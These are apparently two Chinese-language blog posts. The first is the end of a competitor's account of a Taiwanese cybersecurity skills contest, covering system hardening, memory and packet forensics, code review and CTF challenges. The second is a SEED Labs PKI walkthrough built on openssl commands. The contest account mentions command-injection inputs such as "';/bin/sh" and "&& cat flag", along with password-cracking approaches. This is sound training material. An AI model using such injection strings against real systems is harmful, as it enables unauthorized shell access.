或硬體層面的作業系統、記憶體等等，實際上面相滿廣的，簡單的比如說「有人正在學習程式設計，迴圈的關鍵字可能是下面哪一個？」（答案為 for）、或是「在 Linux 中如果想查看網路設備，應該用什麼指令」（答案為 ip），這些都能一眼寫出答案，中等的比如說「在 Linux 中想查看某支 process 的記憶體 dump，應該去哪裡找」（答案為 /proc/[PID]/mem）、或是「下列哪個不是 Windows Active Directory 工具之一」，這種可能就沒有那麼常見，甚至沒用過，但多少猜得出來，再難一點就是一些 Windows 的資安工具，比如說在 Windows 中檢索操作 Windows 作業系統中身分驗證訊息的 mimikatz、提權工具 juicy potato 等等\n可以分享一個滿蠢的情境，題目問「如果我想要列出某個程式連結的動態函式庫，要用哪一個 Linux 指令」，選項大概就是 dll, ddl, ldd, lld，第一個刪掉的是 dll 啦！畢竟那是 Windows 動態連結函式庫名稱 (dynamic link library)，ddl 也不可能，至少沒什麼看過她出現在 command 裡面（回來查之後才發現是 data definition language，跟資料庫有關），ldd 和 lld 就真的卡很久，怎麼唸感覺都很順，不過靠接觸 Linux 三四年的直覺還是猜對了，答案是 ldd，全名為 list dynamic dependencies，如果考試時間再長一點，給我繼續唸我可能會覺得 lld 是對的，什麼 linked library dynamic 好像很合理\n很幸運的我們有從淘汰賽中存活，倒也不是不相信我們會活著，只是很怕就這樣止步真的沒辦法跟 Neokent 交代就是了\n0328 Day2 分區正式賽 # 分區賽跟往年差不多，早上三小時的安全強化 20 分、數位鑑識（將近） 40 分，下午 CTF 40 分，主要 focus 在 pwn, reverse 和 web，不過鑑識那邊多了一個遊戲是 code review，是往年不曾見過的\n安全強化 # 這是最初我覺得要全拿的部分，但寫完歷屆覺得現場應該只能完成六七成左右\n進到正式賽就先來一個不可思議，題目設計了一個平台，四題 Windows 四題 Linux，可以透過測試知道目前安全性問題，如果 patch 掉就能拿到 flag，目標就是拿到八個 flag 賺這 20 分\nWindows 第一題是密碼長度最小值設定，按照過往經驗就是 WIN+R 輸入 gpedit.msc 打開群組政策編輯器，找到安全性原則改一改就好，但很嚴重的問題是這是本機端啊！題目要改的是域密碼策略，也就是從 AD 去改，現場找了很多 AD 的設定，似乎有找到，但不知道怎麼編輯，於是這題的 flag 就留在平台裡了。不過這邊還是放上解答，可以參考Microsoft 的教學文件：為 Active Directory Domain Services 設定更細緻的密碼原則 第二題是域控制器使用了 SMB 1.0，有安全性風險，想要我們處理，解法很直覺就是找到設定 SMB 1.0 的設定看要移除還是調高版本就可以，但這題一樣因為找不到設定的地方所以 flag 也留在平台裡。一樣留個官方解答：在 Windows 中偵測、啟用和停用 SMBv1、SMBv2 和 SMBv3 第三題是有一位 testuser 不符合安全性策略，滿好笑的是 Ray 從 domain administrator 中找到他移除就結束了，安全強化 += 2.5\n第四題則是防火牆，要求遠端桌面只能存取特定 IP range 的連線，那就打開防火牆輸入規則中用戶遠端桌面連線的規則設定這一條就可以了，安全強化 += 2.5\n接下來是 Linux，出乎意料的是 Linux 考題出在 WSL 上面\n第一題屬實有嚇到我，先考了 ssh 的問題，倒不是不知道 ssh，只是覺得在沒有任何資源的情況下不確定能否解出來，這題是說 ssh 允許了 root 連線，題目覺得這應該禁止掉，不外乎就是從 ssh 的設定檔調整，在 /etc/ssh/ssh_config 裡面找到 PermitRootLogin yes 改成 PermitRootLogin no 就拿到 flag 了，安全強化 += 2.5\n第二題是 ssh 用戶中有人不符合密碼原則，想要我把他抓出來，解法應該也是找到他 remove 掉就行，但滿可惜的是我不知道哪裡可以找到 ssh users，所以這題的 flag 就還給平台了\n第三題忘記了\n最後一題說 Linux 中有一個重要的檔案違反最小權限原則，想要我們把它的權限改為 000，其實這題比較麻煩的是不知道所謂重要的檔案是誰，在 Linux 中第一個想到的多半就 /etc/passwd 和 /etc/shadow，但 000 是不是太低是我當時在猶豫的，不過嘗試總會帶出答案，在改完 /etc/passwd 後，flag 也跟著出來，安全強化 += 2.5\n就安全強化的題目來看，跟往年的歷屆不是很雷同，但也都圍繞在很基本很重要的觀念，對於有在接觸 Windows AD 或真的處理過 Linux 設定的選手絕對不是問題\n數位鑑識 # 數位鑑識分成兩部分，一是 memory dump 的分析，另一個則是網路流量封包分析。沒有特別的分組，但主要來說 Ray 負責 memory，我開 wireshark 看封包\n記憶體鑑識 # 記憶體的部分，一樣問作業系統當作送分題、其他則是電腦名稱與當下使用者名稱、記憶體檔的惡意連線 IP、藏起來的特徵值等等\n基本上起手式已經練到一拿到記憶體檔就 python2 vol.py --file=\\PATH\\TO\\MEM\\FILE imageinfo 開下去掃（這是在本機這樣做，但比賽當下 volatility 裝在 Windows，所以是跑到解題工具那邊下 volatility.exe ...），沒意外都是 Win7，果真不出意外意外就來了，這次跑出 Win10，不太一樣沒關係，第一題作業系統 get！\n起初是覺得就版本新一點，而且 Win10 我們更熟悉，還滿開心的，尷尬的是後面題目就解不太出來，起手式第二步通常是 pslist、psscan、filescan、console、cmdscan 這些開下去跑完再作分析，據 Ray 所述 filescan 是空的、console 沒什麼有意義的東西，再去看看題目說這次主要跟連線有關，換個 connscan、connections、sockets、sockscan 等卻都沒有成功，這就是之前沒碰過的地方，volatility 噴一個「不支援 Win10 的 connection scan」，直接阻擋了我們針對連線作分析的手段，也因為這樣記憶體件事其實卡了超級久\n柳暗花明又一村的契機是我看到題目要找 user name，想到之前解用戶密碼都是 hashdump，至少可以看到哪些用戶，所以執行了一下列出可能解，Ray 在後面想到有時候裝函式庫需要自己設定環境變數，所以賭賭看有沒有檔案寫在環境變數，就可以透過檔案路徑發現 username，這個方法確實有效，能夠看到某些檔案路徑就寫著從 website 出發，可以先猜測 username 就是 website，更幸運的事其實 Windows 的環境變數裡就有紀錄 username 和 computer name 分別是什麼，成為更有利的證據。沒錯，記憶體鑑識再加一題！\n個人認為有一個很酷的是今年考了特徵，有點像是找 flag，題目說記憶體中有一個 ws54{...} 的字串，想要我們找出來，剛好翻 volatility 的 help message 時最後一個叫 yarascan，可以指名 yararule 或字串進行搜尋，才想到這或許可以拿來利用一下，滿可惜的是嫂出來包含 ws54 的字串有三組，但都沒有後續 {...} 或像 flag 的長相，這題還是以失敗告吹\n網路封包流量鑑識 # 熟悉的 wireshark 最對味，有種夢回 112-2 去台大修計網的感覺\n這個題組要我們看出這段封包在幹嘛，攻擊者 IP、受害者 domain name、攻擊者利用什麼漏洞取得主機控制權以及漏洞 URL，不要問為什麼我記這麼清楚，啊就我寫的咩！而且看封包看了好一陣子\n簡單來說，我所看到的故事是有一個攻擊者很可疑的一直戳各種可能存在的檔案，受害者機器一直回 404 Not Found，看前幾個封包可以簡單看出誰是好人誰是壞人，也可以猜到接下來攻擊者會幸運猜中一個存在的位置做接下來的攻擊，入侵、取得控制權、躍權 blablabla 的\n後續就沒有那麼明朗，有注意到眾多 404 Not Found 裡面成功的是攻擊者發送 POST request 到 photo.php，檔名看起來就很後門，答題的時候是猜攻擊者透過任意檔案上傳的漏洞上傳了一個 reverse shell 來取得主機控制權，如果是這樣那只要找到合理有利的證據就可以把封包鑑識全壘打，但同時也在懷疑這個 POST request 會不會只是在這個 php 上像是送表單的行為，所以是送出 malicious request，而 photo.php 只是受害者網站本身就存有的後門\nCode review # Code review 佔兩題，一題 3 分，這種題目不是沒寫過，高等資安攻防的時候 YinMuo 的作業就是從 Neokent 程設作業 example code 中找漏洞，當時還要寫 report，至少有寫過簡單的 PoC，這次只要簡單敘述，倒沒這麼難，只要能看出洞在哪就好\n第一題是很良心的 SQL injection，短短幾行有出現 SQL 語句基本上八九不離十，加上沒有任何 filter、prepared statement，答案就很明確了\n第二題是更良心的 buffer overflow，buffer overflow 的題目已經變成掃 pattern 了，看到 strcpy 和 gets 都會反射皺一下眉頭，因為都沒有針對長度進行過濾\n看到 buffer overflow 的時候有再想會不會想考深層一點的 format string，但這次可能是第一年出，所以沒有多繞幾個彎，大膽預測明年後年 format string 可能會列入考題\nCTF # 下午的 CTF 只有三個面向：pwn, rev 以及 web\nPwn 有兩題，基本上是超簡單的 buffer overflow\n第一題搭配 command injection，題目會先問名字 (name)，問完之後問你想說什麼 (msg)，接著把 name 結合到指令 cmd 中，透過 system() 執行 echo 印出 \u0026ldquo;Hello, {name}!\u0026rdquo; 並再透過 printf() 將 msg 印出來，很明顯因為是 system，我有很好的媒介可以拼湊指令得到 shell 的存取權。這題難在哪裡，因為指令要塞在 name 中，可能會想輸入 ';/bin/sh 這種名字，但在輸入完名字之後題目很討厭的去檢查 name 的輸入，如果遇到非小寫英文字母就說偵測到壞壞的字元結束程式，所以不能從 name 下手做壞事，那下一個媒介就是 msg 了，想要從 msg 寫到 name 就勢必得靠 buffer overflow，但接下來就是兩個碰過的問題，一是想要塞 argument 會需要空白字元（比如說 ' \u0026amp;\u0026amp; cat flag），但 scanf() 遇到空白字元會停止接收輸入，後面的東西就讀不到了；但這可以解決，比如前面提及的 ';/bin/sh 直接抓一個 shell 就好，不過那就是第二個問題，會遇到說 termination character 而出錯，這題就卡在這邊看很久沒下文\n第二題是更經典的 buffer overflow，題目一樣 scanf(\u0026quot;%s\u0026quot;, buf) 給我輸入，但目標是要跳到一個同份檔案存在的 win() 函式，簡單來說我要把 scanf() 的 return address 改成 win() 的位置就可以解出這題，阿為什麼沒解出來？好啦！下禮拜開始回去資安攻防演練重上一次課\nRev 有四題，環境提供 ida free 和 ghidra 可以玩\n第一題是 flag checker，但我用 strings 跑下去 flag 就出來了，那就這樣吧！不過還是仔細說一下這題，我沒有特別去逆這題的邏輯，但因為 strings 有東西，表示裡面邏輯應該是 if(input == flag)，總之 CTF += 3\n第二題是加密，需要我們逆向邏輯去解 flag，第三題沒特別看，但這兩題都沒去解\n來到第四題，這次是 html 不是執行檔耶！題目叫做 magic number，提供了一個很像計算機的東西，要我輸入六位數字 (000000 到 999999)，如果猜對會把 flag 告訴我，嗯\u0026hellip; Web 這種的應該 F12 下去看原始碼就好，裡面 script 說到會把 user 輸入的六位數字字串丟去 sha1 跑出 hash 值，hash 後的結果比對相符就會往下解出 flag，程式碼有了，邏輯都有了，寫個腳本去跑就好，那問題是什麼？我寫了一個 javascript 腳本從 000000 跑到 999999，一個一個去試有沒有 match 到的 hash value，如果有我讓他停下來 alert() 跟我說，阿沒錯就是 brute force 解，我覺得 區區 10^6 一百萬種可能性，對眼前這台兩年前教育部整體發展獎補助的 ASUS ProArt PD500TC Intel Core i7 RTX 3060（再鞭會被萬能的萬能科大抓去約談）怎麼可能是問題，嗯結果 VM 被我玩壞了讓我重開一次，可能主辦方沒開很高的資源給 VM？其實測試的時候我很怕技術顧問海豹在我後面突然出現說「這位選手你再這樣破壞競賽環境就剔除資格喔」，這題剛好也在滿後期才解的，還是以失敗告終。其實如果回到 terminal 拿 python 出來寫，說不定可以寫很快，但我競賽當下不太確定 python 要跑這些邏輯確切的語法怎麼寫，比如說 python 裡面的 sha1 是不是需要 Crypt 函式庫，要的話環境有沒有允許，或是用 shell script 跑，但一樣 sha1 怎麼跑？\nWeb 有三題，一樣不是什麼難題，經典的 php injection、資料庫注入和 MD5 decrypt\n第一題是留言板，檢視原始碼發現讀取留言板內文的邏輯是透過 PHP 語句渲染 HTML，表示我可以從中寫入壞壞的 PHP 取得 flag，好一個 PHP 我還不會\n第二題要先輸入帳號密碼，很明顯就資料庫的洞，為什麼不說 SQL injection，因為測試後發現應該不是拿 SQL 寫的，CTF 賽結束後聽旁邊選手交流似乎是 NoSQL，好吧！那我認了\n最後一題一樣要先輸入一個 secret 登入後，可以存取一個上傳文件的頁面，所以應該是複合式題目，後面還要做一個 reverse shell 上傳，後話就不談了，先來說 secret 怎麼得到，題目給一個 hint 說 MD5 後的值，ㄟ MD5？那就是弱密碼 john 一下囉？我記得 rockyou 是海豹比的那一年最後讓他們獲勝的一個小關鍵，如果這次出題跟他們有關係，那就是 john 了！我超級開心的把 MD5 hash value 抓下來丟到 terminal 上拿 rockyou john，結果破解不出來，一度還想是不是我一直忘記 john 的用法，甚至跑了 admin 的 MD5 hash value 測試，但就可以破解的開，表示不是指令問題，那就\u0026hellip;？這題卡在這關就先結束了\n整體來說 CTF 難嗎？不難啊絕對不難！Pwn 那種題目有基本概念解一下絕對不是問題，rev 題二三沒看姑且不說，第四題會寫腳本跑一下就結束了，Web 看的到洞應該就可以解出來，跟以往國內 CTF 比賽相比是很親民了\n心得 \u0026amp;\u0026amp; 致謝 # 雖然說止步於分區賽，但目標算是達到了。這次經歷絕對絕對不能說是毫無收穫，因為三個月的準備歷程比之前任何一次資安競賽都還要盡力，CTF、靶機也打得比之前兇\n人生第一次的技能競賽，倉促的組隊、報名，很多東西都是靠著兩個學生的手邊資源慢慢摸索得到，去年年底報名完，到寒假開始準備，寒假會乖乖寫 CTF，把 pico CTF 的 easy 都完成，從 medium 開始只要有解出來就寫 writeup，開學之後針對技能競賽的歷屆學習新技能，安全強化從熟悉的 Linux 開始，學到 ACL 的概念、iptables 也再次理解，怕正式賽出憑證，還回去看 SEED LAB PKI 的 lab 搞懂 openssl 的指令和邏輯；Windows 則是在 AWS 上開了一台 Windows Server 2022，花了幾天的時間嘗試密碼原則、users、groups 的設定；鑑識比較晚開始，但也是學習了 volatility，也玩了一些 memory forensic 的 labs，不確定會不會有特別的鑑識，在 pico CTF 上也特別著重在鑑識題目的訓練，認識一堆圖片鑑識的工具，什麼 zsteg、steghide 等等，也為了應對技能競賽的 CTF，在正式賽前兩三禮拜順便參加了 pico CTF 2025，維持刷 CTF 的手感\n當然要謝謝跟我一起參加比賽的 Ray，在資安圈 Ray 絕對是新手，結果就被我抓來一個技能點要求極高的活動，競賽兩天從新北大老遠到超偏僻的萬能科大（萬能科大不排除提告），希望這三個月不會讓你對資安打退堂鼓\n下一個要感謝的應該是上學期高等資安攻防演練課程整整 16 週遇到的種種，因為那堂課讓我正式接觸到滲透、攻擊鏈這些更進階的知識，雖然從那堂課之後進展差不多就是認識了一些新名詞，有沒有真的搞懂、甚至會活用是另一個問題，但比起甚麼都不懂，「這個名詞好像有聽過」好很多，至少知道可能成長進步學習的方向\n最後給想參加技能競賽而且花時間讀到這裡的讀者一些不專業建議，畢竟網路上有寫技能競賽準備過程、心得或 writeups 的不像一般 CTF 一樣關鍵字下一下就跑出一堆\n[報名] 技能競賽報名時間很短，確定要比賽之後一定要隨時關注官網，簡章時程也要全部先列進去行事曆，根據大前輩 Mico 說最難的關卡就是報名，過了這關已經贏過很多人了 [報名] 一定要注意郵局關門時間和學校用印時間，最好預留兩天跑流程，當初為了讓報名表給學校用印還需要找系主任和學院院長簽名，這關就卡了一天（尤其當你要找人時，那個人一定剛好不在） [報名] 技能競賽需要有培訓單位，以學生來說就是學校，但需要找一個老師作為指導老師，這個需要先找，同時也表示不能玩玩而已，畢竟掛了學校和老師的名字 [報名] 網路安全組需要兩人組一隊，所以找一個可靠的隊友也需要事前準備 [報名] 政府主辦的活動，聯繫方式只有電話，mail 什麼的找不到 [報名] 需要準備 400 塊，但以今年分區賽來說拿到小禮物和三份餐盒一份便當，應該是賺吧？ [準備] 最好的準備方式就是跟著歷屆準備，考點很明確，可以從裡面學習到需要的技能 [準備] 事前公布的工具表也是準備方向之一，至少要熟悉裡面提到的工具，版本可能是需要考量的因素，像是今年 volatility 給 2.6 版，但現在比較多都用 3.0 版本，因為 2.6 版是用 Python2 在跑，現在誰還在 Python2？為了環境問題也是處理了好一陣子 [競賽] 不能連外網、不能連外網、不能連外網，這點最重要，大多數網路安全競賽都是網路吃到飽，但技能競賽不允許連網，所以很考驗選手各方面知識廣度 [競賽] 呈上一點，網路安全有一個 partner，不完全要求一定要當全能的神，所以「分工」顯得很重要，好的分工可以減輕準備的負擔 [競賽] 這次 CTF 有提供 Cyberchef，但不能保證一定會提供，可以先準備如何使用 command line、各種程式語言做各種 encode, decode [競賽] 賽後記得留下來聽裁判講評，會說一些出題者策略、希望選手學到的技能，或許會被點出一些還可以嘗試、學習的方向 [心態] 參加競賽一定會想要拿到一個名份，但記得在過程中嘗試理解「主辦方想要透過競賽告訴你什麼」，每個出題者在出題時通常都會去想希望答題者怎麼解題，需要用到什麼觀念，某種程度上跟著出題者的設計走完全程一定會是收穫滿滿的 ","date":"2025-04-01","externalUrl":null,"permalink":"/posts/ws-2025/","section":"Blog Posts","summary":"","title":"網路安全技能競賽 - 分區賽紀錄","type":"posts"},{"content":" Motivation # 公開金鑰加密是當前通訊安全的基礎，但在雙方傳送公開金鑰時，也成為中間人攻擊的目標之一，其根本的問題在於 驗證公開金鑰的擁有者 不是件容易的事情，換句話說，如何驗證送過來的公開金鑰就如它聲稱的是來自於該擁有者，而 公開金鑰基礎設施 (Public Key Infrastructure, PKI) 就是此問題的有效解法\nLab Environment # Get Corresponding Files # 至 Seed Labs 2.0 \u0026gt; Crypto \u0026gt; PKI Lab 下載相關檔案，包含 [題目說明] (https://seedsecuritylabs.org/Labs_20.04/Files/Crypto_PKI/Crypto_PKI.pdf )與 lab 環境 DNS Set Up # 在這個 lab 當中，會以 www.bank32.com 作為設定 HTTPS server 的範例，因此需特別針對 DNS 做設定\n# 打開 /etc/hosts，新增下面一行資訊 [02/13/25]seed@VM:~/.../SEEDLAB-PKI$ sudo vim /etc/hosts 10.9.0.80 www.bank32.com Lab Tasks # Task 1: Becoming a Certificate Authority (CA) # :::success 憑證管理中心、憑證頒發機構 (Certificate Authority, CA) 是具公信力第三方，可對個人及機關團體提供認證及憑證簽發管理等服務，而數位憑證 (digital certificates) 可以用來證明一把公開金鑰的擁有性。有些商業類型的 CAs 被稱作根憑證頒發機構 (root CAs)，例如 VeriSign ，一般用戶可以透過 CA 獲取數位憑證，而 CA 的憑證可能是由另一間 CA 所頒發，不斷追溯源頭就會找到一間最大的 CA，即 root CA，而 root CA 的憑證是自行頒發的 (self-signed)，也理所當然的被相信，通常 root CA 憑證都是先裝在大多數的作業系統、網路瀏覽器或其他需要 PKI 的軟體\n這個 task 的目標就是假扮 root CA 產生一張數位憑證，並在之後的 task 頒發憑證給其他 server :::\n要使用 OpenSSL 產生憑證會需要一份設定檔 (configuration file)，通常設定檔會以 .cnf 後綴結尾，供三個 OpenSSL 指令所使用： ca, req 以及 x509。預設上 OpenSSL 會使用 /usr/lib/ssl/openssl.cnf 作為設定檔，但因為我會需要對它做一些修正，所以先將它複製到當前目錄，並告訴 OpenSSL 要使用這份新的配置檔。\n在配置檔中的預設設定提到，所有東西會放在 ./demoCA 底下，頒發的 certs 會放在 $dir/certs，頒發的 crl 會放在 $dir/crl，新憑證會放在 $dir/newcerts，index file 的資料庫為 $dir/index.txt，serial number 會放在 $dir/derial 中。因此先根據上述設定建立環境\n# 把預設的 conf 檔從 /usr/lib/ssl/openssl.cnf 複製過來，重新命名成 myCA_openssl.cnf [02/13/25]seed@VM:~/.../SEEDLAB-PKI$ cp /usr/lib/ssl/openssl.cnf myCA_openssl.cnf # 創建資料夾 demoCA [02/13/25]seed@VM:~/.../SEEDLAB-PKI$ mkdir demoCA # 進到 demoCA [02/13/25]seed@VM:~/.../SEEDLAB-PKI$ cd demoCA/ # 再創建三個資料夾 certs, crl 和 newcerts [02/13/25]seed@VM:~/.../demoCA$ mkdir certs crl newcerts # 創建兩個空白檔案 index.txt 和 serial [02/13/25]seed@VM:~/.../demoCA$ touch index.txt serial # serial 裡面要放 serial number，假設放 1000 [02/13/25]seed@VM:~/.../demoCA$ echo 1000 \u0026gt; serial 又因為這個 lab 可能會對同一個 subject 創建很多次憑證，所以需要特別把 #unique_subject = no 這行取消註解\n# 編輯 myCA_openssl.cnf，將 unique_subject = no 那行取消註解 [02/13/25]seed@VM:~/.../SEEDLAB-PKI$ vim myCA_openssl.cnf # 節錄 myCA_openssl.cnf 內容 [ CA_default ] dir\t= ./demoCA\t# Where everything is kept certs\t= $dir/certs\t# Where the issued certs are kept crl_dir\t= $dir/crl\t# Where the issued crl are kept database\t= $dir/index.txt\t# database index file. unique_subject\t= no\t# Set to \u0026#39;no\u0026#39; to allow creation of # several certs with same subject. new_certs_dir\t= $dir/newcerts\t# default place for new certs. certificate\t= $dir/cacert.pem # The CA certificate serial\t= $dir/serial # The current serial number crlnumber\t= $dir/crlnumber\t# the current crl number # must be commented out to leave a V1 CRL crl\t= $dir/crl.pem # The current CRL private_key\t= $dir/private/cakey.pem# The private key x509_extensions\t= usr_cert\t# The extensions to add to the cert 完成設定檔後，即可透過 openssl 指令產生憑證，又因為這個 lab 是假設為 root CA，因此簽出來的憑證會是自簽憑證，指令如下\n# 使用以下指令產生憑證 [02/13/25]seed@VM:~/.../SEEDLAB-PKI$ openssl req -x509 -newkey rsa:4096 -sha256 -days 3650 -keyout ca.key -out ca.crt -subj \u0026#34;/CN=www.modelCA.com/O=Model CA LTD./C=US\u0026#34; -passout pass:dees Generating a RSA private key ....................................................................................................................................................................................................................++++ .......................................++++ writing new private key to \u0026#39;ca.key\u0026#39; ----- 指令、參數 說明 openssl req 向 root CA 發送憑證簽署要求或自前憑證 -x509 告訴 OpenSSL 這是自簽憑證，而不是簽給別人 -newkey rsa:4096 產生一組大小為 4096 bits 用來簽署憑證的 RSA key-pair -sha256 指定要用 sha256 簽署該憑證 -days 3650 設定有效日期為 3650 天 -keyout ca.key CA private key 儲存於 ca.key 中 -out ca.crt 公鑰憑證 (public key certificate) 存放於 ca.crt 中 -subj \u0026quot;/CN=www.modelCA.com/O=Model CA LTD./C=US\u0026quot; subject information/CN: Common Name/O: Organization/C: Country -passout pass:dees 密碼，每次使用此 CA 為他人簽憑證時都需輸入一次 可以透過以下指令查看憑證\n[02/13/25]seed@VM:~/.../SEEDLAB-PKI$ openssl x509 -in ca.crt -text -noout Certificate: Data: Version: 3 (0x2) Serial Number: 74:cd:b2:fb:e0:15:b2:1f:12:e1:4a:41:39:8d:7b:31:26:9f:b8:44 Signature Algorithm: sha256WithRSAEncryption Issuer: CN = www.modelCA.com, O = Model CA LTD., C = US Validity Not Before: Feb 13 07:38:24 2025 GMT Not After : Feb 11 07:38:24 2035 GMT Subject: CN = www.modelCA.com, O = Model CA LTD., C = US Subject Public Key Info: Public Key Algorithm: rsaEncryption RSA Public-Key: (4096 bit) Modulus: 00:e4:6f:76:32:94:48:4d:c4:e1:18:23:d9:c7:cb:... Exponent: 65537 (0x10001) X509v3 extensions: X509v3 Subject Key Identifier: A5:E9:74:99:52:6F:A3:D7:0E:8A:A6:C1:F6:E6:24:5B:BE:C6:A4:03 X509v3 Authority Key Identifier: keyid:A5:E9:74:99:52:6F:A3:D7:0E:8A:A6:C1:F6:E6:24:5B:BE:C6:A4:03 X509v3 Basic Constraints: critical CA:TRUE Signature Algorithm: sha256WithRSAEncryption 03:e3:a7:4f:b2:e2:6b:df:66:f0:bc:32:1d:3d:c1:25:fb:e3:... 指令、參數 說明 openssl x509 告訴 OpenSSL 要解讀 X509 憑證 -in ca.crt 指定 input file -text 以人類讀得懂的方式顯示該憑證的完整資訊包含擁有者 (Subject) 資訊、發佈人資訊、驗證期限、公鑰資訊、簽章所用演算法等等 -noout 不要顯示 base64 編碼版本如果沒加這行則會同時印出編碼版與文字版 另外，可以透過以下指令查看私鑰\n[02/13/25]seed@VM:~/.../SEEDLAB-PKI$ openssl rsa -in ca.key -text -noout Enter pass phrase for ca.key: RSA Private-Key: (4096 bit, 2 primes) modulus: 00:e4:6f:76:32:94:48:4d:c4:e1:18:23:d9:c7:cb:... publicExponent: 65537 (0x10001) privateExponent: 00:84:df:d4:e7:fc:da:c5:e9:d4:68:ff:49:89:6e:... prime1: 00:f4:53:7e:98:01:5e:0d:f3:86:90:c1:4c:bd:5f:... prime2: 00:ef:59:98:f5:44:32:bf:8f:ad:43:8d:21:8a:e4:... exponent1: 0d:71:82:a7:ae:7b:94:5c:ef:ec:8b:16:43:dd:38:... exponent2: 00:80:cb:d3:f5:57:67:7f:91:8f:08:e4:af:02:10:... coefficient: 00:8f:2f:26:4b:4e:27:5f:bf:17:39:fe:e4:3f:1f:... 指令、參數 說明 openssl rsa 告訴 OpenSSL 要做與 RSA 私鑰相關的事情 -in ca.key 指定 input file -text 以人類讀得懂的方式顯示該憑證的完整資訊包含私鑰組成以及公鑰推導等等 -noout 不要顯示 base64 編碼版本如果沒加這行則會同時印出編碼版與文字版 What part of the certificate indicates this is a CA’s certificate? CA:TRUE\nWhat part of the certificate indicates this is a self-signed certificate? Issuer 與 Subject 皆相同\nIn the RSA algorithm, we have a public exponent e, a private exponent d, a modulus n, and two secret numbers p and q, such that n = pq. Please identify the values for these elements in your certificate and key files. 參數 值 e ca.crt 中的 Exponentca.key 中的 publicExponent d ca.key 中的 privateExponent n ca.crt 中的 Modulusca.key 中的 Modulus p ca.key 中的 prime1 q ca.key 中的 prime2 Task 2: Generating a Certificate Request for Your Web Server # 接下來要幫一間叫做 bank32.com 的公司簽憑證，流程是 bank32.com 發送一個憑證簽署請求 (Certificate Signing Request, CSR)，CSR 會被送到 CA 那邊，再由 CA 驗證提交的身分資訊是否正確，最後產生憑證。在 Task 2 中，會模擬 bank32.com 發送 CSR 至 CA 端\n與 Task 1 十分類似，只是這次不需要加上 -x509，因為這次不是自簽憑證\n[02/13/25]seed@VM:~/.../SEEDLAB-PKI$ openssl req -newkey rsa:2048 -sha256 -keyout server.key -out server.csr -subj \u0026#34;/CN=www.bank32.com/O=Bank32 Inc./C=US\u0026#34; -passout pass:dees Generating a RSA private key .....................................................................+++++ ......................+++++ writing new private key to \u0026#39;server.key\u0026#39; ----- 查看一下 CSR\n[02/13/25]seed@VM:~/.../SEEDLAB-PKI$ openssl req -in server.csr -text -noout Certificate Request: Data: Version: 1 (0x0) Subject: CN = www.bank32.com, O = Bank32 Inc., C = US Subject Public Key Info: Public Key Algorithm: rsaEncryption RSA Public-Key: (2048 bit) Modulus: 00:c9:fc:7a:a2:0e:c3:f8:a1:4c:b6:ee:1c:c9:07:... Exponent: 65537 (0x10001) Attributes: a0:00 Signature Algorithm: sha256WithRSAEncryption 28:78:1e:30:e9:ff:21:48:6a:cb:26:4c:d0:98:ca:48:9a:38:... 不過現今很多網站會有不同的 URL，但都可以連到同一個伺服器，這是因為瀏覽器的 hostname matching policy，可以透過 X509 的延伸套件 (extension) Subject Alternative Name (SAN) 幫主機指定不同 URL 別名，如此提交的 CSR 就會告訴 CA 這些別名都可以使用\n這邊要透過指令 -addext \u0026quot;subjectAltName = DNS:\u0026lt;URL\u0026gt;\u0026quot; 做到，不過需要注意 subjectAltName 中還是必須包含 common name (CN)，否則 CN 會變成 invalid name\n[02/13/25]seed@VM:~/.../SEEDLAB-PKI$ openssl req -newkey rsa:2048 -sha256 -keyout server.key -out server.csr -subj \u0026#34;/CN=www.bank32.com/O=Bank32 Inc./C=US\u0026#34; -passout pass:dees -addext \u0026#34;subjectAltName = DNS:www.bank32.com, DNS:www.bank32A.com, DNS:www.bank32B.com\u0026#34; Generating a RSA private key .................+++++ ....+++++ writing new private key to \u0026#39;server.key\u0026#39; ----- 查看一下更新後的 CSR，就看到有多一段 Requested Extension 指出 URL alias\n[02/13/25]seed@VM:~/.../SEEDLAB-PKI$ openssl req -in server.csr -text -noout Certificate Request: Data: Version: 1 (0x0) Subject: CN = www.bank32.com, O = Bank32 Inc., C = US Subject Public Key Info: Public Key Algorithm: rsaEncryption RSA Public-Key: (2048 bit) Modulus: 00:ec:2a:5a:ac:70:e0:f6:99:20:e0:22:17:cd:f7:... Exponent: 65537 (0x10001) Attributes: Requested Extensions: X509v3 Subject Alternative Name: DNS:www.bank32.com, DNS:www.bank32A.com, DNS:www.bank32B.com Signature Algorithm: sha256WithRSAEncryption 20:ae:80:70:aa:ad:e5:b7:23:62:2f:c8:c5:04:60:34:37:44:... Task 3: Generating a Certificate for your server # 延續 Task 2，在 Task 3 中，要扮演回 CA 的角色，拿著 CSR 幫助 bank32.com 產生憑證。\n要注意的是，因為安全性的考量，OpenSSL 預設不讓 openssl ca 從 request 中複製 extension field 至最終的憑證，但這次先把這個預設打開，從 myCA_openssl.cnf 中取消註解 # copy_extensions = copy\n# 編輯 myCA_openssl.cnf，將 copy_extensions = copy 那行取消註解 [02/13/25]seed@VM:~/.../SEEDLAB-PKI$ vim myCA_openssl.cnf # 節錄 myCA_openssl.cnf 內容 [ CA_default ] dir\t= ./demoCA\t# Where everything is kept certs\t= $dir/certs\t# Where the issued certs are kept crl_dir\t= $dir/crl\t# Where the issued crl are kept database\t= $dir/index.txt\t# database index file. unique_subject\t= no\t# Set to \u0026#39;no\u0026#39; to allow creation of # several certs with same subject. new_certs_dir\t= $dir/newcerts\t# default place for new certs. certificate\t= $dir/cacert.pem # The CA certificate serial\t= $dir/serial # The current serial number crlnumber\t= $dir/crlnumber\t# the current crl number # must be commented out to leave a V1 CRL crl\t= $dir/crl.pem # The current CRL private_key\t= $dir/private/cakey.pem# The private key x509_extensions\t= usr_cert\t# The extensions to add to the cert # Comment out the following two lines for the \u0026#34;traditional\u0026#34; # (and highly broken) format. name_opt = ca_default\t# Subject Name options cert_opt = ca_default\t# Certificate field options # Extension copying option: use with caution. copy_extensions = copy 接著透過下面的指令產生憑證\n[02/13/25]seed@VM:~/.../SEEDLAB-PKI$ openssl ca -config myCA_openssl.cnf -policy policy_anything -md sha256 -days 3650 -in server.csr -out server.crt -batch -cert ca.crt -keyfile ca.key Using configuration from myCA_openssl.cnf Enter pass phrase for ca.key: Check that the request matches the signature Signature ok Certificate Details: Serial Number: 4096 (0x1000) Validity Not Before: Feb 13 09:25:04 2025 GMT Not After : Feb 11 09:25:04 2035 GMT Subject: countryName = US organizationName = Bank32 Inc. commonName = www.bank32.com X509v3 extensions: X509v3 Basic Constraints: CA:FALSE Netscape Comment: OpenSSL Generated Certificate X509v3 Subject Key Identifier: A7:DB:BB:3C:41:57:FD:0F:32:07:B5:25:71:5C:C1:C4:C6:CE:CF:D5 X509v3 Authority Key Identifier: 